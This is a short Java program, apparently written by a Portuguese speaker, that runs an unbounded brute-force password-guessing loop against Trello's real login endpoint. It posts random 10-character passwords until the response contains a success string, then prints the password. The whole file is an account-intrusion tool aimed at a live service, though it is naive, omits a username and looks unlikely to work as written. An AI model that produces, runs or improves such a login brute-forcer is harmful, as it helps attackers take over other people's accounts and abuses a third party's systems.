import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class PasswordGuessingMain {

    public static void main(String[] args) {
        String targetURL = "https://trello.com/login";
        String targetContent = "Conteúdo após login bem-sucedido";

        while (true) {
            String randomPassword = generateRandomPassword();
            boolean loggedIn = attemptLogin(targetURL, randomPassword, targetContent);

            if (loggedIn) {
                System.out.println("Senha correta encontrada: " + randomPassword);
                break;
            } else {
                System.out.println("Senha incorreta: " + randomPassword);
            }
        }
    }

    private static String generateRandomPassword() {
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder password = new StringBuilder();
        Random random = new Random();

        for (int i = 0; i < 10; i++) {
            int index = random.nextInt(characters.length());
            password.append(characters.charAt(index));
        }

        return password.toString();
    }

    private static boolean attemptLogin(String urlStr, String password, String targetContent) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            String postData = "password=" + password;
            connection.getOutputStream().write(postData.getBytes());

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            reader.close();

            return response.toString().contains(targetContent);
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
